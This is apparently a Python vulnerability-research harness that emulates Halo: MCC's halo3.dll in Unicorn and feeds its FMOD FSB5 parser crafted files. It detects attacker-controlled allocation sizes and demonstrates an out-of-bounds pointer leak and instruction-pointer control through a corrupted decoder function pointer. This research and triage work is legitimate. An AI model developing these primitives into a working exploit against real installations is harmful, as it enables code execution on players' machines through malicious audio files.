#!/usr/bin/env python3
"""
rawload.py — a standalone, from-scratch loader + harness for the FMOD FSB codec
inside halo3.dll (Halo: MCC). It does NOT use the game, wine, or the project's
peload; it maps the PE itself with Unicorn and drives the real FSB parser
(halo3+0x4e95d0, the FMOD "FSB Codec" open callback) on an attacker-supplied
file, stubbing only the I/O + allocator boundary so the real parser code runs
on the crafted bytes.

Purpose: observe, byte-exactly, whether attacker-controlled input reaches a CPU
register used as an address (fault address) or the instruction pointer (RIP) —
i.e. demonstrate register / PC influence, not just a crash.

Usage:
  rawload.py <halo3.dll> <fsbfile> [--mode N] [--trace] [--maxins N]
"""
import sys, struct, argparse, pefile, os
from unicorn import *
from unicorn.x86_const import *

# --- env-gated leak-reflection instrument (OFF by default) -------------------
# Mirrors the PELOAD_* convention: inert unless the env var is set. When
# RAWLOAD_LEAK=1 the allocator maps a contiguous "adjacent heap" arena AFTER
# the FSB sample-header blob (NO guard page) and plants a known, recognizable
# pointer-bearing structure (a fake neighbouring FMOD codec object) at
# blob+RAWLOAD_LEAK_DELTA. A read hook then records every read the real FMOD
# parser performs INTO that planted region, so we can prove the attacker-sized
# OOB read lands in mapped memory and lifts the planted pointer WITHOUT faulting.
LEAK_ON    = os.environ.get("RAWLOAD_LEAK") == "1"
LEAK_DELTA = int(os.environ.get("RAWLOAD_LEAK_DELTA", "0x2a0000"), 0)
# a realistic neighbour: a live halo3 .text pointer (decoder fn-ptr / vtable)
# and a heap pointer, exactly the kind of bytes an adjacent FMOD alloc holds.
LEAK_TEXT_PTR = int(os.environ.get("RAWLOAD_LEAK_TEXTPTR", "0x180500e00"), 0)  # halo3+0x500e00 (readData)
LEAK_HEAP_PTR = int(os.environ.get("RAWLOAD_LEAK_HEAPPTR", "0x00007ff612345678"), 0)

# ---- layout -----------------------------------------------------------------
IMAGE_BASE = 0x180000000
STACK_BASE = 0x7f0000000
STACK_SIZE = 0x200000
HEAP_BASE  = 0x300000000       # bump allocator arena
HEAP_SIZE  = 0x4000000
OBJ_BASE   = 0x200000000       # fake FMOD objects (codec state, file, pool)
OBJ_SIZE   = 0x100000
TEB_BASE   = 0x7f8000000       # fake TEB (gs base): StackBase@+8, StackLimit@+0x10
TEB_SIZE   = 0x4000
RET_SENTINEL = 0x4444444444440000   # return address of open(); unmapped -> clean stop

# interesting RVAs in this halo3.dll build
RVA_FSB_READ   = 0x500e00      # codec read/decode dispatcher: call [instance+0xa8]
RVA_FSB_OPEN   = 0x4e95d0
RVA_READHELP   = 0x46b590      # codec file read  (rcx=file, rdx=dst, r8=elemsz, r9=count)
RVA_ALLOC_STATE= 0x4e9160      # allocate codec instance state  -> rax
RVA_MEMALLOC   = 0x461ff0      # FMOD memory alloc (edx = size)  -> rax
RVA_CTOR_CBD0  = 0x00cbd0      # small ctor/init after memalloc  (passthrough)
RVA_MEMOP_C289 = 0x60c289      # memset-ish (rcx=dst, edx=val, r8=size)

class Harness:
    def __init__(self, dllpath, fsbbytes, trace=False, maxins=2_000_000):
        self.pe = pefile.PE(dllpath, fast_load=True)
        self.fsb = fsbbytes
        self.filepos = 0
        self.trace = trace
        self.maxins = maxins
        self.heap = HEAP_BASE
        self.allocs = []            # (addr, size, tag)
        self.alloc_bomb = None      # (requested_size, tag) for absurd controlled sizes
        self.calls = []             # (rip_rva, target_rva)
        self.insn = 0
        self.fault = None
        self.gs_fail = False
        self.ret_ok = False
        # leak-mode state (inert unless RAWLOAD_LEAK=1)
        self.leak = LEAK_ON
        self._blob_planted = False
        self.plant_lo = None        # [plant_lo, plant_hi) = planted adjacent region
        self.plant_hi = None
        self.plant_blob = None      # blob base the plant is relative to
        self.leak_reads = []        # (rip_rva, addr, size, value, off_from_plant)
        self.uc = Uc(UC_ARCH_X86, UC_MODE_64)
        self._map_image()
        self._map_scratch()
        self._hooks()

    # -- memory ----------------------------------------------------------------
    def _map_image(self):
        size = self.pe.OPTIONAL_HEADER.SizeOfImage
        size = (size + 0xfff) & ~0xfff
        self.uc.mem_map(IMAGE_BASE, size, UC_PROT_ALL)
        self.uc.mem_write(IMAGE_BASE, self.pe.header)
        for s in self.pe.sections:
            data = s.get_data()
            if data:
                self.uc.mem_write(IMAGE_BASE + s.VirtualAddress, bytes(data))
        self.image_size = size

    def _map_scratch(self):
        self.uc.mem_map(STACK_BASE, STACK_SIZE, UC_PROT_READ | UC_PROT_WRITE)
        self.uc.mem_map(OBJ_BASE, OBJ_SIZE, UC_PROT_READ | UC_PROT_WRITE)
        # TEB so gs:[0x08]=StackBase, gs:[0x10]=StackLimit (used by __chkstk)
        self.uc.mem_map(TEB_BASE, TEB_SIZE, UC_PROT_READ | UC_PROT_WRITE)
        self.uc.mem_write(TEB_BASE + 0x08, struct.pack("<Q", STACK_BASE + STACK_SIZE))
        self.uc.mem_write(TEB_BASE + 0x10, struct.pack("<Q", STACK_BASE))
        self.uc.mem_write(TEB_BASE + 0x30, struct.pack("<Q", TEB_BASE))   # self
        self.uc.reg_write(UC_X86_REG_GS_BASE, TEB_BASE)

    PAGE = 0x1000
    ALLOC_CAP = 0x400000          # realistic allocations fit here; bigger = "bomb"
    def alloc(self, size, tag=""):
        req = size
        # record absurd attacker-controlled sizes (integer/alloc bomb); still give
        # a small real mapping so we can observe the subsequent write/overflow.
        if req > self.ALLOC_CAP or req == 0:
            if req > self.ALLOC_CAP and self.alloc_bomb is None:
                self.alloc_bomb = (req, tag, self.provenance(req), self.provenance(req >> 2))
            mapped = self.PAGE          # undersized vs intent -> overflow becomes visible
        else:
            mapped = (req + 0xf) & ~0xf
        # LEAK MODE: for the sample-header "blob" alloc (the one the walk at
        # 0x4e92e0 strides through), place the object at the START of a large
        # contiguous arena with NO guard page, and plant a recognizable adjacent
        # FMOD object at blob+LEAK_DELTA. A near-distance OOB read then lands in
        # MAPPED memory (no fault) on the planted pointer.
        if self.leak and not self._blob_planted and tag == "__BLOB__":
            self._blob_planted = True
            arena = ((LEAK_DELTA + 0x10000 + self.PAGE - 1) & ~(self.PAGE - 1))
            base = self.heap
            self.uc.mem_map(base, arena, UC_PROT_READ | UC_PROT_WRITE)
            self.uc.mem_write(base, b"\x00" * arena)
            obj = base                              # blob at arena start (page aligned)
            self._plant_adjacent(base + LEAK_DELTA, blob=obj)
            self.heap = base + arena + self.PAGE    # guard page AFTER the whole arena
            self.allocs.append((obj, req, mapped, "blob(sampleHeadersSize) [leak-arena]"))
            return obj
        pages = (mapped + self.PAGE - 1) & ~(self.PAGE - 1)
        base = self.heap
        self.uc.mem_map(base, pages, UC_PROT_READ | UC_PROT_WRITE)
        self.uc.mem_write(base, b"\x00" * pages)
        # place object flush to the END of its page span so an OOB past the
        # intended size crosses into the UNMAPPED guard page and faults.
        obj = base + pages - (mapped if mapped <= pages else pages)
        self.heap = base + pages + self.PAGE      # leave one unmapped guard page
        self.allocs.append((obj, req, mapped, tag))
        return obj

    def _plant_adjacent(self, where, blob):
        """Write a fake neighbouring FMOD codec object at `where`, holding a live
        halo3 .text pointer (decoder fn-ptr / vtable slot) and a heap pointer -
        exactly the pointer-bearing bytes an adjacent allocation would contain.
        This is the memory the attacker-sized OOB read will disclose."""
        u = self.uc
        # layout mirrors an FMOD codec instance: +0x00 vtable, +0xa8/+0x80 fn-ptrs
        blk = bytearray(0x200)
        struct.pack_into("<Q", blk, 0x00,  LEAK_TEXT_PTR)   # vtable ptr -> halo3 .text
        struct.pack_into("<Q", blk, 0x80,  LEAK_TEXT_PTR)   # decode fn-ptr (+0x80)
        struct.pack_into("<Q", blk, 0xa8,  LEAK_TEXT_PTR)   # decode fn-ptr (+0xa8)
        struct.pack_into("<Q", blk, 0x160, LEAK_HEAP_PTR)   # heap buffer ptr
        u.mem_write(where, bytes(blk))
        self.plant_lo, self.plant_hi, self.plant_blob = where, where + len(blk), blob
        print("[leak] planted adjacent FMOD object @ 0x%x (= blob 0x%x + 0x%x)"
              % (where, blob, where - blob))
        print("[leak]   +0x00 vtable      = 0x%016x  (halo3 .text, ASLR'd base)" % LEAK_TEXT_PTR)
        print("[leak]   +0xa8 decode-fnptr= 0x%016x" % LEAK_TEXT_PTR)
        print("[leak]   +0x160 heap-ptr   = 0x%016x" % LEAK_HEAP_PTR)

    # -- provenance ------------------------------------------------------------
    def provenance(self, val):
        """Where could this 64/32-bit value have come from in the input file?"""
        out = []
        for width in (8, 4):
            needle = (val & ((1 << (8 * width)) - 1)).to_bytes(width, "little")
            if needle == b"\x00" * width:
                continue
            off = self.fsb.find(needle)
            if off != -1:
                out.append("input@0x%x (%d-byte LE)" % (off, width))
                break
        return ", ".join(out) if out else None

    def regs(self):
        u = self.uc
        names = [("rip",UC_X86_REG_RIP),("rsp",UC_X86_REG_RSP),("rbp",UC_X86_REG_RBP),
                 ("rax",UC_X86_REG_RAX),("rbx",UC_X86_REG_RBX),("rcx",UC_X86_REG_RCX),
                 ("rdx",UC_X86_REG_RDX),("rsi",UC_X86_REG_RSI),("rdi",UC_X86_REG_RDI),
                 ("r8",UC_X86_REG_R8),("r9",UC_X86_REG_R9),("r10",UC_X86_REG_R10),
                 ("r11",UC_X86_REG_R11),("r12",UC_X86_REG_R12),("r13",UC_X86_REG_R13),
                 ("r14",UC_X86_REG_R14),("r15",UC_X86_REG_R15)]
        return [(n, u.reg_read(r)) for n, r in names]

    def dump_state(self, title):
        print("\n==================== %s ====================" % title)
        for n, v in self.regs():
            rva = v - IMAGE_BASE
            loc = " (halo3+0x%x)" % rva if 0 <= rva < self.image_size else ""
            prov = self.provenance(v)
            prov = "   <= %s" % prov if prov else ""
            print("  %-3s = 0x%016x%s%s" % (n, v, loc, prov))

    # -- stubs -----------------------------------------------------------------
    def _ret(self, rax=0):
        u = self.uc
        rsp = u.reg_read(UC_X86_REG_RSP)
        retaddr = struct.unpack("<Q", u.mem_read(rsp, 8))[0]
        u.reg_write(UC_X86_REG_RSP, rsp + 8)
        u.reg_write(UC_X86_REG_RIP, retaddr)
        u.reg_write(UC_X86_REG_RAX, rax)

    def stub_readhelp(self):
        u = self.uc
        dst   = u.reg_read(UC_X86_REG_RDX)
        elem  = u.reg_read(UC_X86_REG_R8) & 0xffffffff
        count = u.reg_read(UC_X86_REG_R9) & 0xffffffff
        n = elem * count
        data = self.fsb[self.filepos:self.filepos + n]
        if dst:
            self.uc.mem_write(dst, data.ljust(n, b"\x00") if len(data) < n else data[:n])
        if self.trace:
            print("    [readhelp] pos=0x%x elem=%d count=%d -> %d bytes (have %d)"
                  % (self.filepos, elem, count, n, len(data)))
        self.filepos += n
        self._ret(0)   # FMOD_OK

    def stub_alloc_state(self):
        # 0x4e9160 is a cache LOOKUP: non-NULL => "already parsed, skip".
        # Return NULL so the real FSB parse path executes.
        if self.trace: print("    [cache-lookup 0x4e9160] -> NULL (force real parse)")
        self._ret(0)

    BUILDER_LO, BUILDER_HI = 0x4e92e0, 0x4e95c1   # sample-table builder bounds
    def stub_memalloc(self):
        size = self.uc.reg_read(UC_X86_REG_RDX) & 0xffffffff
        tag = "memalloc(0x%x)" % size
        # In leak mode, the FIRST alloc made from inside the builder (0x4e92e0)
        # is the sample-header blob the OOB walk strides through: mark it so the
        # allocator plants the adjacent object relative to IT (not an earlier
        # codec-state alloc).
        if self.leak and not self._blob_planted:
            rsp = self.uc.reg_read(UC_X86_REG_RSP)
            try:
                caller = struct.unpack("<Q", self.uc.mem_read(rsp, 8))[0] - IMAGE_BASE
            except UcError:
                caller = -1
            if self.BUILDER_LO <= caller < self.BUILDER_HI:
                tag = "__BLOB__"
        a = self.alloc(size if size else 0x10, tag)
        if self.trace: print("    [memalloc] size=0x%x -> 0x%x" % (size, a))
        self._ret(a)

    def stub_ctor(self):
        # called right after memalloc as: mov rdx,rax; call cbd0; then mov [rax],rax
        rdx = self.uc.reg_read(UC_X86_REG_RDX)
        self._ret(rdx)

    def stub_memop(self):
        dst = self.uc.reg_read(UC_X86_REG_RCX)
        val = self.uc.reg_read(UC_X86_REG_RDX) & 0xff
        size = self.uc.reg_read(UC_X86_REG_R8) & 0xffffffff
        if dst and size and size < 0x1000000:
            try: self.uc.mem_write(dst, bytes([val]) * size)
            except UcError: pass
        self._ret(0)

    STUBS = {}
    def _install_stubs(self):
        self.STUBS = {
            IMAGE_BASE + RVA_READHELP:    self.stub_readhelp,
            IMAGE_BASE + RVA_ALLOC_STATE: self.stub_alloc_state,
            IMAGE_BASE + RVA_MEMALLOC:    self.stub_memalloc,
            IMAGE_BASE + RVA_CTOR_CBD0:   self.stub_ctor,
            IMAGE_BASE + RVA_MEMOP_C289:  self.stub_memop,
        }

    # -- hooks -----------------------------------------------------------------
    def _hooks(self):
        self._install_stubs()
        self.uc.hook_add(UC_HOOK_CODE, self._hook_code)
        self.uc.hook_add(UC_HOOK_MEM_READ_UNMAPPED | UC_HOOK_MEM_WRITE_UNMAPPED |
                         UC_HOOK_MEM_FETCH_UNMAPPED | UC_HOOK_MEM_READ_PROT |
                         UC_HOOK_MEM_WRITE_PROT | UC_HOOK_MEM_FETCH_PROT,
                         self._hook_mem_invalid)
        if self.leak:
            # record every READ that lands in the planted adjacent region
            self.uc.hook_add(UC_HOOK_MEM_READ, self._hook_mem_read)

    def _hook_mem_read(self, uc, access, address, size, value, _):
        if self.plant_lo is None or not (self.plant_lo <= address < self.plant_hi):
            return True
        rip = uc.reg_read(UC_X86_REG_RIP)
        try:
            raw = bytes(uc.mem_read(address, size))
            val = int.from_bytes(raw, "little")
        except UcError:
            val = None
        self.leak_reads.append((rip - IMAGE_BASE, address, size, val, address - self.plant_blob))
        return True

    def _hook_code(self, uc, address, size, _):
        self.insn += 1
        if address == RET_SENTINEL:
            self.ret_ok = True; uc.emu_stop(); return
        if self.insn > self.maxins:
            uc.emu_stop(); self.fault = ("insn-limit", address); return
        stub = self.STUBS.get(address)
        if stub:
            rva = address - IMAGE_BASE
            self.calls.append(("stub", rva)); stub(); return
        # record call instructions (direct + indirect) for path + PC-control detection
        try:
            code = bytes(uc.mem_read(address, min(size, 15)))
        except UcError:
            code = b""
        if code[:1] == b"\xe8" and size == 5:   # direct call rel32
            disp = struct.unpack("<i", code[1:5])[0]
            tgt = (address + 5 + disp)
            self.calls.append(("call", tgt - IMAGE_BASE))
        elif code[:2] in (b"\xff\xd0", b"\xff\xd1", b"\xff\xd2", b"\xff\xd3") or \
             (len(code) >= 2 and code[0] == 0xff and (code[1] & 0x38) == 0x10):
            # indirect call ff /2
            self.calls.append(("icall@0x%x" % (address - IMAGE_BASE), None))

    def _hook_mem_invalid(self, uc, access, address, size, value, _):
        rip = uc.reg_read(UC_X86_REG_RIP)
        rva = rip - IMAGE_BASE
        kind = {UC_MEM_READ_UNMAPPED:"read-unmapped", UC_MEM_WRITE_UNMAPPED:"write-unmapped",
                UC_MEM_FETCH_UNMAPPED:"FETCH-unmapped (PC CONTROL)", UC_MEM_READ_PROT:"read-prot",
                UC_MEM_WRITE_PROT:"write-prot", UC_MEM_FETCH_PROT:"FETCH-prot (PC CONTROL)"}.get(access, str(access))
        if address == RET_SENTINEL:
            self.ret_ok = True
            uc.emu_stop(); return False
        self.fault = {
            "kind": kind, "access": access, "fault_addr": address, "size": size,
            "rip": rip, "rva": rva if 0 <= rva < self.image_size else None,
            "addr_prov": self.provenance(address),
        }
        uc.emu_stop()
        return False

    # -- run -------------------------------------------------------------------
    def run(self, mode_arg=0, exinfo=0):
        u = self.uc
        # fake codec state object
        state = OBJ_BASE
        pool  = OBJ_BASE + 0x10000       # [state+0x48]
        cfile = OBJ_BASE + 0x20000       # [state+0x190]
        u.mem_write(state, b"\x00" * 0x400)
        u.mem_write(pool,  b"\x00" * 0x200)
        u.mem_write(cfile, b"\x00" * 0x200)
        u.mem_write(state + 0x48,  struct.pack("<Q", pool))
        u.mem_write(state + 0x190, struct.pack("<Q", cfile))
        # codec file object: fields read by readhelp bounds logic -> make permissive
        u.mem_write(cfile + 0x20,  struct.pack("<I", 0xffffffff))   # [file+0x20] = -1 (skip bounds)
        # stack
        rsp = STACK_BASE + STACK_SIZE - 0x800
        rsp &= ~0xf
        u.mem_write(rsp, struct.pack("<Q", RET_SENTINEL))
        u.reg_write(UC_X86_REG_RSP, rsp)
        u.reg_write(UC_X86_REG_RCX, state)        # arg1: codec state
        u.reg_write(UC_X86_REG_RDX, mode_arg)     # arg2: mode flags
        u.reg_write(UC_X86_REG_R8,  exinfo)       # arg3: exinfo (0)
        u.reg_write(UC_X86_REG_R9,  0)
        print("[*] mapped halo3.dll @ 0x%x (size 0x%x)" % (IMAGE_BASE, self.image_size))
        print("[*] driving FSB open halo3+0x%x on %d-byte file (mode_arg=0x%x)"
              % (RVA_FSB_OPEN, len(self.fsb), mode_arg))
        try:
            u.emu_start(IMAGE_BASE + RVA_FSB_OPEN, RET_SENTINEL, count=0)
        except UcError as e:
            if self.fault is None:
                self.fault = {"kind": "UcError: %s" % e, "fault_addr": None,
                              "rip": u.reg_read(UC_X86_REG_RIP)}
        self._report()

    def run_read(self, fnptr_a8=0x4141414141414141, fnptr_80=0x4242424242424242):
        """Drive the decode dispatcher halo3+0x500e00 directly with a codec
        instance whose decoder function pointers (+0xa8, +0x80) are set to tag
        values, as a heap overflow / groom would leave them. Demonstrates that
        readData transfers control through instance+0xa8 with no CFG check."""
        u = self.uc
        inst = OBJ_BASE + 0x40000
        out  = OBJ_BASE + 0x50000
        pbr  = OBJ_BASE + 0x51000
        u.mem_write(inst, b"\x00" * 0x400)
        # fields readData touches before the indirect call
        u.mem_write(inst + 0x13c, struct.pack("<I", 0))       # format selector
        u.mem_write(inst + 0x30,  struct.pack("<I", 1))       # subsound count-ish
        u.mem_write(inst + 0xa8,  struct.pack("<Q", fnptr_a8))# decode fn-ptr  (CORRUPTED)
        u.mem_write(inst + 0x80,  struct.pack("<Q", fnptr_80))# decode fn-ptr  (CORRUPTED)
        self._tag_a8 = fnptr_a8; self._tag_80 = fnptr_80
        rsp = STACK_BASE + STACK_SIZE - 0x800
        rsp &= ~0xf
        u.mem_write(rsp, struct.pack("<Q", RET_SENTINEL))
        u.reg_write(UC_X86_REG_RSP, rsp)
        u.reg_write(UC_X86_REG_RCX, inst)                     # arg1: codec instance
        u.reg_write(UC_X86_REG_RDX, out)                      # arg2: output buffer
        u.reg_write(UC_X86_REG_R8,  0x1000)                   # arg3: bytes requested
        u.reg_write(UC_X86_REG_R9,  pbr)                      # arg4: &bytes_read (within OBJ region)
        print("[*] driving decode dispatcher halo3+0x%x" % RVA_FSB_READ)
        print("    instance+0xa8 (decode fn-ptr) = 0x%016x  <-- corrupted/tagged" % fnptr_a8)
        print("    instance+0x80 (decode fn-ptr) = 0x%016x  <-- corrupted/tagged" % fnptr_80)
        try:
            u.emu_start(IMAGE_BASE + RVA_FSB_READ, RET_SENTINEL, count=0)
        except UcError as e:
            if self.fault is None:
                self.fault = {"kind": "UcError: %s" % e, "fault_addr": None,
                              "rip": u.reg_read(UC_X86_REG_RIP)}
        self._report(read_mode=True)

    def _leak_report(self):
        if not self.leak:
            return
        print("\n==================== LEAK-REFLECTION (SQ1) ====================")
        if self.plant_lo is None:
            print("  [leak] no adjacent region was planted (no qualifying blob alloc).")
            return
        print("  planted adjacent object: [0x%x .. 0x%x)  (blob 0x%x + 0x%x)"
              % (self.plant_lo, self.plant_hi, self.plant_blob, self.plant_lo - self.plant_blob))
        if not self.leak_reads:
            print("  [leak] the parser performed NO read into the planted region.")
            return
        print("  >>> the real FMOD parser READ planted pointer bytes at attacker-chosen")
        print("      offsets WITHOUT faulting (OOB read landed in MAPPED memory):")
        for rva, addr, size, val, off in self.leak_reads:
            dp = self.provenance((addr - self.plant_blob) & 0xffffffff)
            print("    halo3+0x%-6x read %d byte(s) @ 0x%x  (blob+0x%x%s)  = 0x%0*x"
                  % (rva, size, addr, addr - self.plant_blob,
                     ("  <= OOB distance %s" % dp) if dp else "", size * 2, (val or 0)))
            # name which planted field this hit
            po = addr - self.plant_lo
            field = {0x00: "+0x00 vtable ptr", 0x80: "+0x80 decode fn-ptr",
                     0xa8: "+0xa8 decode fn-ptr", 0x160: "+0x160 heap ptr"}.get(po)
            if field and size >= 4:
                print("        ^ low %d bytes of planted %s = 0x%016x"
                      % (size, field, LEAK_TEXT_PTR if po != 0x160 else LEAK_HEAP_PTR))

    def _report(self, read_mode=False):
        print("[*] instructions executed: %d" % self.insn)
        if self.alloc_bomb:
            req, tag, p1, p2 = self.alloc_bomb
            print("[!] ATTACKER-CONTROLLED ALLOCATION SIZE: 0x%x (%s)%s%s" % (
                req, tag,
                ("  size<=input %s" % p1) if p1 else "",
                ("  size/4<=input %s" % p2) if p2 else ""))
        rip = self.uc.reg_read(UC_X86_REG_RIP)
        # path: last distinct call targets
        path = " ".join(("0x%x" % c) if k == "call" else k
                         for k, c in self.calls[-24:])
        print("[*] call path (tail): %s" % path)
        self._leak_report()
        if (self.ret_ok or rip == RET_SENTINEL) and not self.fault:
            print("[=] open() returned to sentinel cleanly. rax=0x%x (FMOD_RESULT; 0=OK)"
                  % self.uc.reg_read(UC_X86_REG_RAX))
            return
        if not self.fault:
            print("[=] stopped at RIP=0x%x (halo3+0x%x) with no recorded fault."
                  % (rip, rip - IMAGE_BASE))
            return
        f = self.fault
        print("\n########################## FAULT ##########################")
        if isinstance(f, tuple):
            print("  %s at 0x%x" % f); return
        if read_mode and isinstance(f, dict):
            fa = f.get("rip")
            tags = {getattr(self, "_tag_a8", None): "instance+0xa8",
                    getattr(self, "_tag_80", None): "instance+0x80"}
            if fa in tags:
                print("  *** RIP CONTROL CONFIRMED ***")
                print("  readData (halo3+0x%x) performed an INDIRECT CALL through the" % RVA_FSB_READ)
                print("  codec instance's decoder function pointer, with NO CFG check,")
                print("  and execution was redirected to the attacker value at %s." % tags[fa])
                print("  RIP = 0x%016x  (= the planted pointer, byte-for-byte)" % fa)
        print("  type        : %s" % f["kind"])
        fa = f["fault_addr"] or 0
        print("  fault addr  : 0x%016x%s" % (fa,
              ("   <= %s" % f["addr_prov"]) if f.get("addr_prov") else ""))
        # locate fault address relative to the controlling allocation and show
        # whether the OOB *distance* is attacker-controlled (provenance on delta)
        near = None
        for (obj, req, mapped, tag) in self.allocs:
            span_lo, span_hi = obj - 0x2000, obj + max(req, mapped) + 0x200000
            if span_lo <= fa <= span_hi:
                if near is None or abs(fa - obj) < abs(fa - near[0]):
                    near = (obj, req, mapped, tag)
        if near:
            obj, req, mapped, tag = near
            delta = fa - obj
            dp = self.provenance(delta & 0xffffffff) or self.provenance(delta)
            print("  vs alloc    : %s @0x%x (intended size 0x%x, mapped 0x%x)"
                  % (tag, obj, req, mapped))
            print("  OOB distance: 0x%x past object base%s"
                  % (delta, ("   <= distance %s" % dp) if dp else ""))
        print("  faulting RIP: 0x%016x%s" % (f["rip"],
              ("  (halo3+0x%x)" % f["rva"]) if f.get("rva") is not None else "  (OUTSIDE IMAGE)"))
        self.dump_state("REGISTER STATE AT FAULT")
        # stack window
        try:
            rsp = self.uc.reg_read(UC_X86_REG_RSP)
            print("\n  stack @ rsp:")
            for i in range(8):
                qv = struct.unpack("<Q", self.uc.mem_read(rsp + i*8, 8))[0]
                prov = self.provenance(qv)
                print("    [rsp+0x%02x] = 0x%016x%s" % (i*8, qv, ("  <= %s" % prov) if prov else ""))
        except UcError:
            pass


def build_fsb5(numSamples=1, sampleHeadersSize=0x40, nameTableSize=0, dataSize=0x40,
               mode=0x10, f1c=0, f20=0, tail=b"", version=1):
    h = bytearray(0x3c)
    h[0:4]   = b"FSB5"
    struct.pack_into("<I", h, 0x04, version)
    struct.pack_into("<I", h, 0x08, numSamples)
    struct.pack_into("<I", h, 0x0c, sampleHeadersSize)
    struct.pack_into("<I", h, 0x10, nameTableSize)
    struct.pack_into("<I", h, 0x14, dataSize)
    struct.pack_into("<I", h, 0x18, mode)
    struct.pack_into("<I", h, 0x1c, f1c)
    struct.pack_into("<I", h, 0x20, f20)
    return bytes(h) + tail


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("dll")
    ap.add_argument("fsb", nargs="?", help="file to parse (omit to use a built FSB5)")
    ap.add_argument("--mode", type=lambda x: int(x,0), default=0x10)
    ap.add_argument("--nsamples", type=lambda x: int(x,0), default=1)
    ap.add_argument("--nametbl", type=lambda x: int(x,0), default=0)
    ap.add_argument("--shsize", type=lambda x: int(x,0), default=0x40)
    ap.add_argument("--f1c", type=lambda x: int(x,0), default=1)
    ap.add_argument("--f20", type=lambda x: int(x,0), default=0)
    ap.add_argument("--modearg", type=lambda x: int(x,0), default=0)
    ap.add_argument("--trace", action="store_true")
    ap.add_argument("--decode", action="store_true",
                    help="drive the decode dispatcher 0x500e00 with a corrupted instance fn-ptr")
    ap.add_argument("--a8", type=lambda x: int(x,0), default=0x4141414141414141)
    ap.add_argument("--maxins", type=int, default=2_000_000)
    a = ap.parse_args()
    if a.decode:
        h = Harness(a.dll, b"", trace=a.trace, maxins=a.maxins)
        h.run_read(fnptr_a8=a.a8)
        return
    if a.fsb:
        data = open(a.fsb, "rb").read()
    else:
        data = build_fsb5(numSamples=a.nsamples, sampleHeadersSize=a.shsize,
                          nameTableSize=a.nametbl, mode=a.mode, f1c=a.f1c, f20=a.f20,
                          tail=bytes(range(256)) * 8)
    h = Harness(a.dll, data, trace=a.trace, maxins=a.maxins)
    h.run(mode_arg=a.modearg)


if __name__ == "__main__":
    main()
